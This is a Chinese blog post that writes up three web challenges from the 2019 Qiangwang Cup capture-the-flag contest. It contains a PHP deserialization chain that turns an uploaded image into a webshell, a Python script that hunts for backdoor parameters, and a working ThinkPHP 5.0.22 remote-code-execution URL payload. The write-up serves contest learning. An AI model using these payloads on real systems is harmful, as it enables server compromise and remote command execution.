<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    
    <title>2019第三届强网杯部分WEB WP | Math &amp; Sec ，HACHp1的个人博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="2019第三届强网杯部分WEB WP">
<meta name="keywords" content="Web安全">
<meta property="og:type" content="article">
<meta property="og:title" content="2019第三届强网杯部分WEB WP">
<meta property="og:url" content="http://hachp1.github.io/posts/Web安全/20190530-19qwb.html">
<meta property="og:site_name" content="Math &amp; Sec ，HACHp1的个人博客">
<meta property="og:description" content="2019第三届强网杯部分WEB WP">
<meta property="og:image" content="http://120.78.185.175/img/thumbnails/eggs.jpg">
<meta property="og:updated_time" content="2019-05-30T14:49:44.032Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2019第三届强网杯部分WEB WP">
<meta name="twitter:description" content="2019第三届强网杯部分WEB WP">
<meta name="twitter:image" content="http://120.78.185.175/img/thumbnails/eggs.jpg">
    

    

    
        <link rel="icon" href="/css/images/favicon.png" />
    

    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="/libs/open-sans/styles.css">
    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">

    <link rel="stylesheet" href="/css/style.css">

    <script src="/libs/jquery/2.1.3/jquery.min.js"></script>
    
    
        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
    
    
    
    
    


</head>

<body>
    <div id="container">
        <header id="header">
    <div id="header-main" class="header-inner">
        <div class="outer">
            <a href="/" id="logo">
                <i class="logo"></i>
                <span class="site-title">Math &amp; Sec ，HACHp1的个人博客</span>
            </a>
            <nav id="main-nav">
                
                    <a class="main-nav-link" href="/.">Home</a>
                
                    <a class="main-nav-link" href="/archives">Archives</a>
                
                    <a class="main-nav-link" href="/categories">Categories</a>
                
                    <a class="main-nav-link" href="/tags">Tags</a>
                
                    <a class="main-nav-link" href="/about">About</a>
                
            </nav>
            
                
                <nav id="sub-nav">
                    <div class="profile" id="profile-nav">
                        <a id="profile-anchor" href="javascript:;">
                            <img class="avatar" src="/css/images/avatar.png" />
                            <i class="fa fa-caret-down"></i>
                        </a>
                    </div>
                </nav>
            
            <div id="search-form-wrap">

    <form class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
        <button type="submit" class="search-form-submit"></button>
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="Type something..." />
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
            UNTITLED: '(Untitled)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
<script src="/js/insight.js"></script>

</div>
        </div>
    </div>
    <div id="main-nav-mobile" class="header-sub header-inner">
        <table class="menu outer">
            <tr>
                
                    <td><a class="main-nav-link" href="/.">Home</a></td>
                
                    <td><a class="main-nav-link" href="/archives">Archives</a></td>
                
                    <td><a class="main-nav-link" href="/categories">Categories</a></td>
                
                    <td><a class="main-nav-link" href="/tags">Tags</a></td>
                
                    <td><a class="main-nav-link" href="/about">About</a></td>
                
                <td>
                    
    <div class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
    </div>

                </td>
            </tr>
        </table>
    </div>
</header>

        <div class="outer">
            
                

<aside id="profile">
    <div class="inner profile-inner">
        <div class="base-info profile-block">
            <img id="avatar" src="/css/images/avatar.png" />
            <h2 id="name">HACHp1</h2>
            <h3 id="title">生活少有按照行动而改变，那就抓住那几个少有的。</h3>
            <span id="location"><i class="fa fa-map-marker"></i>China</span>
            <a id="follow" target="_blank" href="https://github.com/hachp1">FOLLOW</a>
        </div>
        <div class="article-info profile-block">
            <div class="article-info-block">
                19
                <span>posts</span>
            </div>
            <div class="article-info-block">
                6
                <span>tags</span>
            </div>
        </div>
        
        <div class="profile-block social-links">
            <table>
                <tr>
                    
                    
                    <td>
                        <a href="https://github.com/HACHp1" target="_blank" title="GitHub" class=tooltip>
                            <i class="fa fa-GitHub"></i>
                        </a>
                    </td>
                    
                </tr>
            </table>
        </div>
        
    </div>
</aside>

            
            <section id="main"><article id="post-2019第三届强网杯部分WEB-WP" class="article article-type-post" itemscope itemprop="blogPost">
    <div class="article-inner">
        
            
	
		<img src="http://120.78.185.175/img/banner/websec.png" class="article-banner" />
	



        
        
            <header class="article-header">
                
    
        <h1 class="article-title" itemprop="name">
            2019第三届强网杯部分WEB WP
        </h1>
    

                
                    <div class="article-meta">
                        
    <div class="article-date">
        <i class="fa fa-calendar"></i>
        <a href="/posts/Web安全/20190530-19qwb.html">
            <time datetime="2019-05-30T03:13:55.000Z" itemprop="datePublished">2019-05-30</time>
        </a>
    </div>


                        
    <div class="article-category">
    	<i class="fa fa-folder"></i>
        <a class="article-category-link" href="/categories/Web安全/">Web安全</a>
    </div>

                        
    <div class="article-tag">
        <i class="fa fa-tag"></i>
        <a class="tag-link" href="/tags/Web安全/">Web安全</a>
    </div>

                    </div>
                
            </header>
        
        
        <div class="article-entry" itemprop="articleBody">
        
            
			<h1 id="第三届强网杯部分web-wp">2019第三届强网杯部分WEB WP</h1>
<a id="more"></a>
<h2 id="upload">UPLOAD</h2>
<ul>
<li>注意此题需要在<strong>PHP7</strong>环境中才能复现，在PHP5中由于异常处理机制，不会调用析构函数。</li>
</ul>
<ol style="list-style-type: decimal">
<li>打开网页，发现是一个注册登陆页面，注册之后可以上传图片。 <img src="http://120.78.185.175/img/blogimg/qwb/1.png" alt="img"> <img src="http://120.78.185.175/img/blogimg/qwb/2.png" alt="img"></li>
<li>扫描根目录，发现有源码<code>www.gz.tar</code>，下载后可以看到在tp5目录中有<code>.idea</code>文件夹，说明是使用phpstorm写的。导入phpstorm发现了两个断点： <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Register.php</span></div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index(); <span class="comment">// 断点1</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Index.php</span></div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</div><div class="line">        $profile=cookie(<span class="string">'user'</span>);</div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile)); </div><div class="line">            <span class="comment">// 断点2</span></div><div class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</div><div class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</div><div class="line">                <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div></pre></td></tr></table></figure>
<p>提示反序列化存在漏洞。</p>
<ol start="3" style="list-style-type: decimal">
<li>结合本题为上传题，猜测是要结合反序列化和上传两个点攻击。观察析构函数，如果<code>registed</code>为False则调用checker的index函数。</li>
<li>查找是否有可以利用的类，发现<code>Profile.php</code>中的<code>Profile</code>类中无<code>index</code>函数，而且有<code>__call</code>函数： <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></li>
</ol>
<p>如果调用Profile类的index函数，就会调用<code>__call('index')</code>，此时，如果构造的Profile类的index指向任意一个函数，就会调用该函数。而本题是上传题，首先想到<code>upload_img</code>函数: <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</div><div class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</div><div class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</div><div class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</div><div class="line">                <span class="keyword">exit</span>();</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</div><div class="line">            <span class="keyword">$this</span>-&gt;ext_check();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</div><div class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</div><div class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</div><div class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</div><div class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</div><div class="line">                <span class="keyword">$this</span>-&gt;update_img();</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>可以看到在<code>if($this-&gt;ext)</code>之后的逻辑中，可以通过修改<code>$this-&gt;filename_tmp</code>和<code>$this-&gt;filename</code>达到图片重命名的目的，将上传的图片马还原为webshell。</p>
<ol start="5" style="list-style-type: decimal">
<li>所以先上传一个图片马。 <img src="http://120.78.185.175/img/blogimg/qwb/3.png" alt="img"></li>
<li>然后构造payload： <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $checker;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $filename_tmp;</div><div class="line">    <span class="keyword">public</span> $filename;</div><div class="line">    <span class="keyword">public</span> $ext;</div><div class="line">    <span class="keyword">public</span> $except;</div><div class="line">    <span class="keyword">public</span> $index;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$reg=<span class="keyword">new</span> Register();</div><div class="line">$prof=<span class="keyword">new</span> Profile();</div><div class="line">$prof-&gt;filename_tmp=<span class="string">'upload/837ec5754f503cfaaee0929fd48974e7/00bf23e130fa1e525e332ff03dae345d.png'</span>;<span class="comment">//原文件名（图片马</span></div><div class="line">$prof-&gt;filename=<span class="string">'upload/1.php'</span>;<span class="comment">//目标文件名</span></div><div class="line">$prof-&gt;ext=<span class="keyword">true</span>;<span class="comment">//过检查</span></div><div class="line">$prof-&gt;index=<span class="string">'upload_img'</span>;</div><div class="line"></div><div class="line">$reg-&gt;registed = <span class="keyword">false</span>;<span class="comment">//register析构函数中的条件</span></div><div class="line">$reg-&gt;checker=$prof;</div><div class="line"><span class="keyword">echo</span> base64_encode(serialize($reg));</div></pre></td></tr></table></figure></li>
</ol>
<p>将输出代替cookie中的user值，访问。 <img src="http://120.78.185.175/img/blogimg/qwb/4.png" alt="img"> 7. 可以看到成功重命名webshell了。 <img src="http://120.78.185.175/img/blogimg/qwb/5.png" alt="img"> 8. 拿蚁剑连接可以在根目录处找到flag。 <img src="http://120.78.185.175/img/blogimg/qwb/6.png" alt="img"></p>
<h2 id="高明的黑客">高明的黑客</h2>
<ul>
<li>我在做这道题的时候想的是用hook，但是发现这道题用hook似乎没办法做，因为文件太多了，而只有一个文件可以用，不可能手工挨个试。</li>
<li>在本地复现的时候，想法很简单，先按文件匹配出POST和GET的参数，然后对每个参数都传入<code>system(whoami)</code>和<code>whoami</code>，分别对应eval型和直接调用system型webshell。</li>
</ul>
<h3 id="做题过程">做题过程：</h3>
<ol style="list-style-type: decimal">
<li>下载源码</li>
<li><p>编写脚本： <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">return_files</span><span class="params">(rootDir)</span>:</span></div><div class="line">    list_dirs = os.walk(rootDir)</div><div class="line">    funfiles=[]</div><div class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> list_dirs:</div><div class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> files:</div><div class="line">            funfiles.append(os.path.join(root, f))</div><div class="line">    <span class="keyword">return</span> funfiles</div><div class="line"></div><div class="line">IF_DEBUG=<span class="keyword">False</span></div><div class="line"></div><div class="line">exp_list=[<span class="string">'whoami'</span>,<span class="string">'system("whoami")'</span>]</div><div class="line">url_pre=<span class="string">'http://localhost:802/qwb/web2/'</span></div><div class="line"></div><div class="line">pat1=<span class="string">r"\$_GET\['(\w+)'\]"</span></div><div class="line">pat2=<span class="string">r"\$_POST\['(\w+)'\]"</span></div><div class="line"></div><div class="line"></div><div class="line">files=return_files(<span class="string">'src'</span>)</div><div class="line">i=<span class="number">0</span></div><div class="line"><span class="keyword">for</span> vfile <span class="keyword">in</span> files:</div><div class="line">    print(i,vfile)</div><div class="line">    i+=<span class="number">1</span></div><div class="line">    get_params=[]</div><div class="line">    post_params=[]</div><div class="line">    <span class="keyword">with</span> open(vfile) <span class="keyword">as</span> fr:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            lines=fr.readlines()</div><div class="line">        <span class="keyword">except</span> UnicodeDecodeError:</div><div class="line">            print(vfile)</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</div><div class="line">            get_params+=re.findall(pat1,line)</div><div class="line">            post_params+=re.findall(pat2,line)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> exp <span class="keyword">in</span> exp_list:</div><div class="line">        post_dic=&#123;&#125;</div><div class="line">        <span class="keyword">for</span> post_param <span class="keyword">in</span> post_params:</div><div class="line">            post_dic[post_param]=exp</div><div class="line"></div><div class="line">        shell_name=vfile[<span class="number">4</span>:]</div><div class="line">        <span class="keyword">if</span>(len(get_params+post_params)!=<span class="number">0</span>):</div><div class="line">            t1=requests.get(url_pre+shell_name).text</div><div class="line">            temp_url=url_pre+shell_name+<span class="string">'?'</span></div><div class="line">            <span class="keyword">for</span> get_param <span class="keyword">in</span> get_params:</div><div class="line">                temp_url+=get_param+<span class="string">'='</span>+exp+<span class="string">'&amp;'</span></div><div class="line">            temp_url=temp_url[:<span class="number">-1</span>]</div><div class="line">            <span class="keyword">if</span>(IF_DEBUG):</div><div class="line">                print(t1)</div><div class="line">                print(temp_url)</div><div class="line">                print(post_dic)</div><div class="line">                exit()</div><div class="line">            </div><div class="line">            t2=requests.post(temp_url,data=post_dic).text</div><div class="line">            <span class="keyword">if</span>(len(t1)!=len(t2)):</div><div class="line">                print(temp_url)</div><div class="line">                print(post_dic)</div></pre></td></tr></table></figure></p></li>
<li><p>对本地一通扫之后，输出： <figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/qwb/web2/xk0SzyKwfzw.php?z5c_TrB=whoami&amp;xd0UXc39w=whoami&amp;xd0UXc39w=whoami&amp;DdWk_nXmZTF_Dt=whoami&amp;dthxTqRPg8YtH=whoami&amp;ImPVuGCXfrS=whoami&amp;O0yRgyjaOF7m=whoami&amp;DeMcscsp=whoami&amp;YV8nqJDhD=whoami&amp;EMNPxS2A7=whoami&amp;kBVLzQEgb=whoami&amp;kBVLzQEgb=whoami&amp;Efa5BVG=whoami&amp;i_QfWB2x1=whoami&amp;i_QfWB2x1=whoami&amp;E8NPXbr7Cq=whoami&amp;zfEddFlxaK_FTO3A=whoami&amp;qjWSY5fjcgNtb=whoami&amp;qUVRuZTF27EhUKTI=whoami</div></pre></td></tr></table></figure></p></li>
<li><p>由于不想挨个找参数，我直接替换掉每个参数： <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">url=<span class="string">'http://localhost/qwb/web2/xk0SzyKwfzw.php?z5c_TrB=whoami&amp;xd0UXc39w=whoami&amp;xd0UXc39w=whoami&amp;DdWk_nXmZTF_Dt=whoami&amp;dthxTqRPg8YtH=whoami&amp;ImPVuGCXfrS=whoami&amp;O0yRgyjaOF7m=whoami&amp;DeMcscsp=whoami&amp;YV8nqJDhD=whoami&amp;EMNPxS2A7=whoami&amp;kBVLzQEgb=whoami&amp;kBVLzQEgb=whoami&amp;Efa5BVG=whoami&amp;i_QfWB2x1=whoami&amp;i_QfWB2x1=whoami&amp;E8NPXbr7Cq=whoami&amp;zfEddFlxaK_FTO3A=whoami&amp;qjWSY5fjcgNtb=whoami&amp;qUVRuZTF27EhUKTI=whoami'</span></div><div class="line">print(url.replace(<span class="string">'whoami'</span>,<span class="string">'cat /flag'</span>))</div></pre></td></tr></table></figure></p></li>
<li><p>访问得到flag</p></li>
</ol>
<h2 id="强网先锋-上单">强网先锋 上单</h2>
<ul>
<li>进入界面，发现thinkphp版本为5.0.22，立刻想到前端时间写过博客的<a href="https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20190124-5.x%20RCE.html">RCE</a>，直接上payload： <figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</div></pre></td></tr></table></figure></li>
</ul>
<p>拿到flag</p>
<h2 id="前两道题的源码">前两道题的源码</h2>
<p>https://github.com/HACHp1/hackable_cms_store/tree/master/qwb</p>

        
        </div>
        <footer class="article-footer">
            <div class="share-container">


    <div class="bdsharebuttonbox">
    <a href="#" class="bds_more" data-cmd="more">分享到：</a>
    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间">QQ空间</a>
    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博">新浪微博</a>
    <a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博">腾讯微博</a>
    <a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网">人人网</a>
    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信">微信</a>
</div>
<script>
window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"16"},"share":{"bdSize":16}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
</script>
<style>
    .bdshare_popup_box {
        border-radius: 4px;
        border: #e1e1e1 solid 1px;
    }
    .bdshare-button-style0-16 a,
    .bdshare-button-style0-16 .bds_more {
        padding-left: 20px;
        margin: 6px 10px 6px 0;
    }
    .bdshare_dialog_list a,
    .bdshare_popup_list a,
    .bdshare_popup_bottom a {
        font-family: 'Microsoft Yahei';
    }
    .bdshare_popup_top {
        display: none;
    }
    .bdshare_popup_bottom {
        height: auto;
        padding: 5px;
    }
</style>


</div>

            
    

        </footer>
    </div>
    
        
<nav id="article-nav">
    
        <a href="/posts/Web安全/20190615-19guosaixx.html" id="article-nav-newer" class="article-nav-link-wrap">
            <strong class="article-nav-caption">Newer</strong>
            <div class="article-nav-title">
                
                    2019国赛西南赛区部分WEB WP
                
            </div>
        </a>
    
    
        <a href="/posts/机器学习/20190409-treeAlgorithm2.html" id="article-nav-older" class="article-nav-link-wrap">
            <strong class="article-nav-caption">Older</strong>
            <div class="article-nav-title">树相关-XGBoost与LightGBM</div>
        </a>
    
</nav>


    
</article>


    
    
        <section id="comments">
    <div id="valine-thread"></div>
</section>
    

</section>
            
                
<aside id="sidebar">
   
        
    <div class="widget-wrap">
        <h3 class="widget-title">recent</h3>
        <div class="widget">
            <ul id="recent-post" class="">
                
                    <li>
                        
                        <div class="item-thumbnail">
                            <a href="/posts/Web安全/20190616-prce.html" class="thumbnail">
    
    
        <span style="background-image:url(http://120.78.185.175/img/thumbnails/planet_yellow.jpg)" alt="PRCE 正则最大回溯次数" class="thumbnail-image"></span>
    
</a>

                        </div>
                        
                        <div class="item-inner">
                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
                            <p class="item-title"><a href="/posts/Web安全/20190616-prce.html" class="title">PRCE 正则最大回溯次数</a></p>
                            <p class="item-date"><time datetime="2019-06-16T04:45:13.000Z" itemprop="datePublished">2019-06-16</time></p>
                        </div>
                    </li>
                
                    <li>
                        
                        <div class="item-thumbnail">
                            <a href="/posts/Web安全/20190615-19guosaixx.html" class="thumbnail">
    
    
        <span style="background-image:url(http://120.78.185.175/img/thumbnails/planet_red.png)" alt="2019国赛西南赛区部分WEB WP" class="thumbnail-image"></span>
    
</a>

                        </div>
                        
                        <div class="item-inner">
                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
                            <p class="item-title"><a href="/posts/Web安全/20190615-19guosaixx.html" class="title">2019国赛西南赛区部分WEB WP</a></p>
                            <p class="item-date"><time datetime="2019-06-15T09:00:00.000Z" itemprop="datePublished">2019-06-15</time></p>
                        </div>
                    </li>
                
                    <li>
                        
                        <div class="item-thumbnail">
                            <a href="/posts/Web安全/20190530-19qwb.html" class="thumbnail">
    
    
        <span style="background-image:url(http://120.78.185.175/img/thumbnails/eggs.jpg)" alt="2019第三届强网杯部分WEB WP" class="thumbnail-image"></span>
    
</a>

                        </div>
                        
                        <div class="item-inner">
                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
                            <p class="item-title"><a href="/posts/Web安全/20190530-19qwb.html" class="title">2019第三届强网杯部分WEB WP</a></p>
                            <p class="item-date"><time datetime="2019-05-30T03:13:55.000Z" itemprop="datePublished">2019-05-30</time></p>
                        </div>
                    </li>
                
                    <li>
                        
                        <div class="item-thumbnail">
                            <a href="/posts/机器学习/20190409-treeAlgorithm2.html" class="thumbnail">
    
    
        <span style="background-image:url(http://120.78.185.175/img/thumbnails/ml.jpg)" alt="树相关-XGBoost与LightGBM" class="thumbnail-image"></span>
    
</a>

                        </div>
                        
                        <div class="item-inner">
                            <p class="item-category"><a class="article-category-link" href="/categories/机器学习/">机器学习</a></p>
                            <p class="item-title"><a href="/posts/机器学习/20190409-treeAlgorithm2.html" class="title">树相关-XGBoost与LightGBM</a></p>
                            <p class="item-date"><time datetime="2019-04-09T09:49:27.000Z" itemprop="datePublished">2019-04-09</time></p>
                        </div>
                    </li>
                
                    <li>
                        
                        <div class="item-thumbnail">
                            <a href="/posts/Web安全/20190124-5.x RCE.html" class="thumbnail">
    
    
        <span style="background-image:url(http://120.78.185.175/img/thumbnails/eggs.jpg)" alt="Thinkphp 5.x RCE漏洞" class="thumbnail-image"></span>
    
</a>

                        </div>
                        
                        <div class="item-inner">
                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
                            <p class="item-title"><a href="/posts/Web安全/20190124-5.x RCE.html" class="title">Thinkphp 5.x RCE漏洞</a></p>
                            <p class="item-date"><time datetime="2019-01-23T16:04:00.000Z" itemprop="datePublished">2019-01-24</time></p>
                        </div>
                    </li>
                
            </ul>
        </div>
    </div>

    
        
    <div class="widget-wrap">
        <h3 class="widget-title">tags</h3>
        <div class="widget">
            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux日常/">Linux日常</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/心情随笔/">心情随笔</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习/">机器学习</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习-算法/">机器学习-算法</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习初步/">机器学习初步</a><span class="tag-list-count">3</span></li></ul>
        </div>
    </div>

    
        
    <div class="widget-wrap">
        <h3 class="widget-title">tag cloud</h3>
        <div class="widget tagcloud">
            <a href="/tags/Linux日常/" style="font-size: 12.5px;">Linux日常</a> <a href="/tags/Web安全/" style="font-size: 20px;">Web安全</a> <a href="/tags/心情随笔/" style="font-size: 10px;">心情随笔</a> <a href="/tags/机器学习/" style="font-size: 17.5px;">机器学习</a> <a href="/tags/机器学习-算法/" style="font-size: 12.5px;">机器学习-算法</a> <a href="/tags/机器学习初步/" style="font-size: 15px;">机器学习初步</a>
        </div>
    </div>

    
        
    <div class="widget-wrap widget-list">
        <h3 class="widget-title">links</h3>
